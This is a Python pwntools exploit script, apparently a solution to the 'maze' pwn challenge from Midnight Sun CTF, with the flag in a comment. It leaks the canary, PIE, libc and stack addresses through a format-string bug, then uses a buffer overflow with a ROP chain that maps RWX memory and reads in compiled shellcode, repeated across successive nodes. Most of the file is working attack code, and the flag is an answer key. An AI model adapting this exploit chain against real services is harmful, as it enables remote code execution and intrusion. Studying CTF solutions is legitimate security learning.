#!/usr/bin/env python

# midnight{if_y0u_st4re_into_the_spl0it_the_spl0it_stares_back_at_you}

from os import system

from pwn import *

maze = ELF("./maze")
if args.REMOTE:
    libc = ELF("./libc.so.6")
else:
    libc = ELF("/usr/lib/libc-2.32.so")
context.binary = maze


def conn():
    if args.REMOTE:
        p = remote("pwn-maze-01.play.midnightsunctf.se", 10000)
    elif args.GDB:
        p = gdb.debug("./maze")
    else:
        p = process("./maze")

    p.recvuntil("MAZE OF TWISTY")
    p.recvline()

    return p


def partner_fd(fd):
    if fd % 2:
        return fd + 1
    else:
        return fd - 1


def exploit(p, fd_read):
    def do_fmt(x):
        p.sendline(b"SHOUT " + x)
        p.recvuntil("YOU HEAR AN ECHO")
        p.recvline()
        return p.recvline().strip()

    fmt2 = FmtStr(do_fmt, offset=42, padlen=2, numbwritten=0)

    def dump_stack(off):
        return int(do_fmt("%{}$p".format(off + 1).encode()), 16)

    canary = dump_stack(105)
    # info("canary: 0x%x", canary)

    pie = dump_stack(113)
    # info("pie: 0x%x", pie)
    pie_base = (pie & ~0xFFF) - 0x2000
    # info("pie_base: 0x%x", pie_base)
    maze.address = pie_base

    try:
        lib = dump_stack(215)
    except ValueError as e:
        info("NULL")
        # p.sendline("OPEN")
        # info("%s", p.recvrepeat(5))
        # p.sendline("OPEN")
        # info("%s", p.recvrepeat(5))
        # pause()
        context.log_level = "DEBUG"
        lib = dump_stack(217)
    # info("lib: 0x%x", lib)
    lib_base = lib - (0x27000 + 0xB3 if args.REMOTE else 0x26000 + 0x2152)
    # info("lib_base: 0x%x", lib_base)
    libc.address = lib_base

    stack = dump_stack(115)
    # info("stack: 0x%x", stack)
    sc_base = stack - 0x260 + 8
    # info("sc_base: 0x%x", sc_base)

    r = ROP(libc)
    r.mmap(0x10000, 0x10000, 7, 0x32)
    r.read(fd_read, 0x10000, 0x10000)
    r.puts(libc.address)
    # info("ROP:\n%s", r.dump())
    rop = p64(libc.address + (0xC9CCF if args.REMOTE else 0xD5700)) + r.chain() + p64(0x10000)
    bof = b"A" * 0x208 + p64(canary) + b"B" * 0x38 + rop
    assert len(bof) < 0x400
    p.sendline(bof)
    p.recvuntil("THE VOID STARES")
    p.recvline()

    var_escaped = sc_base - 8 - 0x114
    fmt2.write(var_escaped, 0)
    fmt2.execute_writes()

    sleep(0.1)

    p.send(build_sc(fd_read))


def build_sc(fd_read):
    if fd_read == 0:
        fd_read = 1
    from random import randrange

    name = randrange(0, 1000000)
    assert 0 == system(
        "compile_nostdlib -t native sc.c -o sc_%d.elf --cflags '-DINCOMING_FD=%d'" % (name, fd_read)
    )
    assert 0 == system("extract_shellcode sc_%d.elf sc_%d.sc" % (name, name))
    shellcode = read("sc_%d.sc" % name)
    assert len(shellcode) < 0x10000
    return shellcode


p = conn()

# node 1
exploit(p, 0)
info("-" * 100)

context.timeout = 10

i = 0
while True:
    i += 1
    # next node
    p.recvuntil("started")
    x = p.recvuntil("valid fd:").decode()
    info("%s", x)
    if "midnight" in x or "{" in x:
        pause()
    fd = int(p.recvline().strip())
    # if i == 6:
    #     p.sendline("OPEN")
    #     p.interactive()
    fdp = partner_fd(fd)
    info("fd: %d, partner: %d", fd, fdp)
    exploit(p, fdp)
    info("-" * 100 + " " + str(i))

p.interactive()
